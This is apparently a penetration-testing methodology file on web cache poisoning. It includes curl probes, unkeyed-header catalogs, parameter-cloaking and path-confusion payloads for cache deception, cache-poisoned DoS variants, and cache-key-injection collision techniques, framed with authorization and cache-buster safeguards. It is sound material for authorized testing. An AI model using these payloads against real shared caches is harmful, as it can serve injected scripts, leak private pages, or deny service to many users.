# Web cache poisoning techniques (steps 1–4)
# Always cache-bust while probing (unique ?cb=) so you don't poison the real page; only drop the
# buster to CONFIRM a cross-user hit, with approval. Record in poison_tests.jsonl:
# {input, keyed, reflected, cached, hit_on_clean_request, impact}.

## Detect cacheability
```
curl -sI "https://TARGET/path?cb=rs1" | grep -iE 'x-cache|age|cache-control|vary|cf-cache-status'
```
`X-Cache: hit`/`cf-cache-status: HIT` + `Age:` increasing ⇒ cached. `Vary:` lists keyed headers.

## Unkeyed inputs to try (reflected but NOT in the cache key)
```
X-Forwarded-Host: evil.example
X-Forwarded-Scheme: nothttps        # some apps redirect to X-Forwarded-Scheme://X-Forwarded-Host
X-Forwarded-Port: 1337
X-Host: evil.example
X-Original-URL: /evil
X-Rewrite-URL: /evil
X-Forwarded-Server: evil.example
```
Plus unkeyed query params (Param Miner "guess params"): a param that changes the body but not the key.

## Confirm (the proof)
1. Poison with a cache-buster you own: `curl -s "https://TARGET/?cb=rs7f3q" -H 'X-Forwarded-Host: evil.example'`
2. Re-request WITHOUT the attacker header, SAME buster: `curl -s "https://TARGET/?cb=rs7f3q"`
3. If the clean request returns the poisoned content (`X-Cache: hit`) → confirmed cross-user poisoning.

## Cache deception (variant)
`https://TARGET/account.php/nonexistent.css` — if the CDN caches by extension, a private page may be
cached and served to anonymous users. Confirm a second anonymous request gets the private content.

## Hygiene
Benign payloads; buster-scoped; approval for shared caches; purge or let short TTL expire; cleanup.md.

---
## Extended arsenal — cache-key discovery & unkeyed-input methodology
The cache key = the subset of the request the cache uses to pick a stored response. An input that changes
the RESPONSE but is NOT in the key is poisonable. Always probe with your own `?cb=` buster.
```
### Map the key (what makes a HIT vs a MISS)
curl -sI "https://HOST/?cb=rs1" | grep -i '^vary'                       # Vary advertises SOME keyed headers
curl -s  "https://HOST/?cb=rs2" -H 'X-Forwarded-Host: a.rs'             # prime
curl -s  "https://HOST/?cb=rs2" -H 'X-Forwarded-Host: b.rs'             # response still shows a.rs -> UNKEYED
```
- Keyed input → changing it yields a MISS/new entry (safe, not cross-user poisonable).
- Unkeyed input that **reflects** → poisoning candidate.
- Unkeyed input that changes behavior without reflecting (redirect target, resource URL) → still poisonable.
Buster channels to rotate so you never touch the real key: `?cb=`, an unused param, a value in a keyed
`Vary` header, `Accept-Encoding`, or an `Origin`/cookie the key includes.

---
## Extended arsenal — header-poisoning catalog (unkeyed → gadget)

| Header | Typical gadget in the response |
|---|---|
| `X-Forwarded-Host` / `X-Host` / `X-Forwarded-Server` | absolute links, `<script src>` origin, redirect `Location`, reset-link host |
| `X-Forwarded-Scheme` / `-Proto` / `-SSL` / `Front-End-Https` | http↔https redirect loop / downgrade |
| `X-Forwarded-Port` | port baked into generated absolute URLs |
| `X-Forwarded-For` / `X-Real-IP` / `True-Client-IP` / `CF-Connecting-IP` | geo/ACL logic; logged+reflected values |
| `X-Original-URL` / `X-Rewrite-URL` / `X-Override-URL` / `X-Forwarded-Path` / `X-Forwarded-Prefix` | internal routing / path reflected |
| `X-Forwarded-Host` + `X-Forwarded-Scheme` together | fully attacker-controlled absolute base URL |
| `Forwarded: host=evil.example` | RFC 7239 equivalent of XFH |
| `X-Host-Override` / `X-HTTP-Host-Override` | framework host override |

```
# Prime on your buster, then read back clean (same buster, no header) to confirm a cross-user hit:
curl -s "https://HOST/?cb=rs7f3q" -H 'X-Forwarded-Host: TOKEN.oob.example'
curl -s "https://HOST/?cb=rs7f3q"      # clean request reflects TOKEN.oob.example -> confirmed
```

---
## Extended arsenal — parameter cloaking & cache-key normalization
Exploit a parser discrepancy: the cache and the origin disagree about the URL/params, so a payload the
cache treats as part of an unkeyed/excluded param reaches the origin as a real, reflected param.
```
# Excluded "tracking" params the cache strips from the key but the origin still parses + reflects:
?utm_content=<payload>   ?utm_source=x&real=<payload>   ?fbclid=<payload>   ?gclid=<payload>
# Delimiter discrepancy (one layer splits on ; or , the other doesn't):
?keyed=1;poison=<payload>        ?callback=legit&callback=<payload>     # duplicate-param (HPP) cloaking
# Path / normalization differences between cache and origin:
/path%2f..%2fother    /path/%2e%2e/other    /path/..;/other    /PATH (case)    /path//    /path/.
# Encoded chars the cache normalizes but the origin decodes late (or vice-versa) -> key says A, body reflects B.
```
This section is the cache-vs-origin **parser-discrepancy** cousin (the two layers disagree about which
bytes are params/path). The distinct **key-collision** mechanism — where the cache's OWN key string is
built by delimiter-less concatenation so two different requests serialize to one key — has its own section
below (**cache key injection**). HPP mechanics → parameter-pollution skill.

---
## Extended arsenal — fat-GET & method/verb tricks
```
# Cache keys the URL but not the BODY; the origin reads a param from the body -> unkeyed body input:
GET /search?cb=rs8 HTTP/1.1
Host: HOST

q=<payload>                              # a body on a GET; the cached response reflects q
# Method-override headers: cache sees the cacheable GET, origin treats it as another verb:
X-HTTP-Method-Override: POST      X-HTTP-Method: POST      X-Method-Override: PUT
```

---
## Extended arsenal — web cache deception (path-confusion expanded)
Make a CDN cache a PRIVATE, authenticated page under a key an ANONYMOUS user can also request. Confirm
BENIGNLY with YOUR OWN second (unauthenticated) request on the crafted path — never a victim's.
```
/account/.css      /account.php/x.css      /account/%2e%2e/x.js      /account;x.css      /account%00.css
/account%0a.css    /account#.css           /account?.css            /api/me/nonexistent.js
/profile/..%2fx.css    /settings/\x.ico
# Static extensions CDNs cache by default: .css .js .png .jpg .gif .ico .svg .woff .woff2 .txt .map
# Delimiters that split origin-path vs cache-rule:  ;   %3f(?)   %23(#)   %2e(.)   %00   newline   //
```
- Origin maps `/account/x.css` → the `/account` handler (serves private content).
- CDN sees the `.css` suffix → caches it as a static asset.
- A second anonymous request to the same path returns the cached private page = deception confirmed.
Keep it to a TEST account's page and your own anonymous re-request; redact anything personal.

---
## Extended arsenal — poisoning gadgets → impact

| Gadget (unkeyed input lands in…) | Impact | Hand-off |
|---|---|---|
| reflected unencoded into HTML/JS | stored-style XSS served from cache | xss-* |
| `X-Forwarded-Host` in `Location:` | mass open redirect for all cached users | open-redirect |
| XFH in `<script src>` / `<link href>` | malicious resource import | — |
| `X-Forwarded-Scheme` downgrade | redirect loop / forced-http | — |
| reset-password/email host = XFH | account-takeover link host | host-header |
| cached `Set-Cookie` / cookie reflect | session fixation / cookie bomb | — |

Confirm the GADGET benignly (reflection of `TOKEN.oob.example`), then rate the impact; execute the
downstream bug only via its own skill, still buster-scoped.

---
## Extended arsenal — cache-poisoned DoS (CPDoS) — catalogued, do NOT fire
These poison an ERROR/oversized response into the cache, denying the real page. Awareness only — never
execute against a shared cache (it harms real users). Note feasibility for the report.

| Variant | Trigger |
|---|---|
| HHO (HTTP Header Oversize) | an oversized header the origin 400s; the cache stores the 400 |
| HMC (HTTP Meta Character) | a control char in a header → origin error cached |
| HMO (HTTP Method Override) | an override header makes the origin error → cached |

---
## Extended arsenal — multi-layer caches, Vary, TTL & safe confirmation
- **Layers:** CDN edge, reverse proxy, framework/app cache, browser. Each has its OWN key — a header keyed
  at the CDN may be unkeyed at the app cache. Fingerprint each: `X-Cache`, `Age`, `cf-cache-status`,
  `X-Served-By`, `X-Cache-Hits`, `Via`.
- **`Vary` abuse:** `Vary: User-Agent` means your poison only serves to matching UAs — narrows the blast
  radius; good for a safe PoC (scope the poison to your buster + your own UA).
- **TTL / `s-maxage` / `Age`:** wait out a short TTL for cleanup; prefer a soon-expiring entry for the PoC.
- **Confirmation discipline:** prime and read back on the SAME self-chosen buster; prove cross-user with a
  SECOND identity hitting that buster (never the real key). Never issue PURGE/BAN. If the only way to show
  impact is poisoning the real key, STOP and report the unkeyed input + gadget as the finding.

---
## Extended arsenal — cache key injection (keyed-input collisions via delimiter-less key construction)
A SECOND, distinct way to make a shared cache serve one request's content to another — the mirror image of
classic poisoning. **Classic poisoning abuses an UNKEYED input; cache key injection abuses the KEYED ones.**
No unkeyed reflection is needed: you manipulate the keyed fragments so **two DIFFERENT requests serialize to
the SAME cache-key string**, then one request reads (or overwrites) the other's cached entry.

**Root cause.** The cache builds its key by CONCATENATING variable-length, attacker-influenceable fragments
— scheme, host, path, query, and selected request headers — into one string, then hashes/stores under it.
When those fragments are joined **without an unambiguous delimiter**, adjacent fragments abut, so a byte can
be **shifted across a fragment boundary** and still produce an identical concatenation. The cache sees one
key; the origin routes/reflects by its OWN independent parse of the real request, so it treats the two
requests differently. Hashing the key is NOT a fix — identical strings hash identically; the fix is a
delimiter (or length-prefix/encoding) that can't appear inside a fragment.

**Distinguish from the neighbours (route correctly):**
- vs **classic unkeyed poisoning** — opposite mechanism: CKI weaponises the KEYED inputs, not an unkeyed one.
- vs **parameter cloaking / normalization** (section above) — that is a cache-vs-ORIGIN disagreement about
  which bytes are a param/path; CKI is a collision of the cache's OWN key string via boundary confusion.
- vs **web cache deception** — the ACL-bypass READ outcome resembles deception (read a cached privileged
  response) but the vector is a KEY COLLISION, needs no crafted content-type / path-extension, and no victim
  interaction (no one has to visit your link).

### Boundary-confusion primitives (the byte-shift catalogue)
Find two ADJACENT, unseparated, attacker-influenceable keyed fragments `A|B` where moving a byte from the
end of `A` to the start of `B` (or vice-versa) yields the same concatenation. Common pairs:
```
# URI ↔ a keyed header (key = …$uri$http_<header>)  — move bytes across the uri/header seam:
/XY     + <keyed-header>: Z         collides with     /XYZ    + <keyed-header>: (empty)
#   concrete: /*  + Accept: /*      collides with     /*      + Accept: */*   (the extra '*' migrates)
# scheme ↔ host (key = $scheme$host) — the trailing 's' of 'https' migrates into a reflected Host:
http   + Host: sdummy.example       collides with     https   + Host: dummy.example
#   (needs http & https serving the same content with no forced redirect, and Host reflected)
# empty-fragment shifting — an empty $is_args/$args/$query lets the neighbours abut and the seam move.
# generic: any unseparated A|B pair in the key where end-of-A and start-of-B are both controllable.
```

### Detect (benign, always on YOUR cache-buster channel)
A delimiter-less key is exposed by a **split-invariance probe**: send the same bytes split two different ways
across a seam and see if they share a cache entry.
```
# 1. pick a cacheable endpoint; prime on a buster you own with one split:
curl -s "https://TARGET/anyendpoint?cb=rsK1" -H 'X-Test: 123'
# 2. request the SAME buster with the bytes split differently across the uri↔header seam:
curl -s "https://TARGET/anyend?cb=rsK1"       -H 'X-Test: point123'
# 3. if step 2 is served step 1's body (X-Cache: HIT, no fresh origin fetch) -> keys collided -> CKI-capable.
```
In YOUR OWN lab, request a debug header that echoes the assembled key string to SEE the missing delimiter;
against a live target, infer it from the HIT on the second (differently-split) request.

### Confirm BENIGNLY (the proof — same cross-request-serve discipline as the rest of this skill)
The confirmation standard is a **collision pair with a self-canary**, buster-scoped, no real user touched:
1. **Prime** key K via request **A** carrying your own canary marker, on a unique `?cb=` you control.
2. **Read back** via a DIFFERENT request **B** whose split you computed to collide to the SAME K.
3. If **B returns A's canary from cache** (`X-Cache: HIT` / `Age` > 0) — two different requests sharing one
   cached entry — the collision is CONFIRMED. The HIT on the differently-shaped request IS the proof.
- **ACL-bypass READ variant:** demonstrate ONLY with your own two test requests — a response YOU authorised
  + cached, read back through a colliding unprivileged request. NEVER read a real user's cached private data.
- Both prime and read-back ride a unique buster you own; never collide onto a production key / real path.
  No PURGE/BAN; let a short TTL expire; record in `cleanup.md`. If impact can only be shown by colliding onto
  the real key, STOP and report the collision primitive + gadget as the finding.

### Impact → hand-off
| CKI outcome | Impact | Hand-off |
|---|---|---|
| unprivileged request collides onto a cached PRIVILEGED response | ACL-bypass disclosure of cached content | host-header (if Host-driven) |
| scheme-confused key caches a reflected `Host` in `<script src>` | persistent XSS served from cache | xss-* |
| collide onto the key for a real page + serve a cached error/404 | cache-poisoned DoS (**catalogue only — do NOT fire on a shared cache**) | — |
| edge cache bypasses for your request (e.g. an `Authorization` header) while the origin cache does not | poison the ORIGIN cache THROUGH the edge (layered) | — |

Severity scales with endpoint sensitivity, TTL, the number of users sharing the key, and whether the poison
propagates across cache layers. Confirm the collision benignly first, then rate; execute any downstream bug
only via its own skill, still buster-scoped.
